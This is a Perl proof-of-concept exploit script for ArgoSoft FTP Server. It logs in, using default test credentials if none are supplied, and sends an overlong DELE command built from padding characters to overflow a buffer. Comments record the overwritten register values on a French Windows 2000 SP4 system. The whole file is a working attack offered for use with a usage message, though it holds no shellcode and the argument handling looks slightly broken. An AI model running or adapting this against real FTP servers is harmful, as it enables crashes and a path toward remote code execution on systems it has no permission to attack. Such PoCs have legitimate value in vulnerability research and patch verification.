#!/usr/bin/perl

# ---------------------------------------------------- #
# ArgoSoftFTP.pl - PoC exploit for ArgoSoft FTP Server #
# Jerome Athias #
# ---------------------------------------------------- #

use Net::FTP;

# geting data
$host = ARGV[0];
$port = ARGV[1];
$debug = ARGV[2];
$user = ARGV[3];
$pass = ARGV[4];

# ===========

if (($host) && ($port)) {
       
# make exploit string
$exploit_string = "DELE ";
$exploit_string .= "A" x 2041;
$exploit_string .= "B" x 4;
$exploit_string .= "C" x 1026;

# On Win2K SP4 FR:
# EAX 42424241
# ECX 43434343
# EDX 43434342
# EBX 43434B73

        # ===================
       
        print "Trying to connect to $host:$port\n";
        $sock = Net::FTP->new("$host",Port => $port, TimeOut => 30,
Debug=> $debug) or die "[-] Connection failed\n";
        print "[+] Connect OK!\n";
        print "Logging...\n";
        if (!$user) {
             $user = "test";
             $pass = "test";
        }
        $sock->login($user, $pass);
        $answer = $sock->message;
        print "Sending string...\n";
        $sock->quot($exploit_string);
} else {
        print "ArgoSoft FTP Server - PoC
Exploit\nhttps://www.securinfos.info\n\nUsing: $0 host port username
password [debug: 1 or 0]\n\n";
}
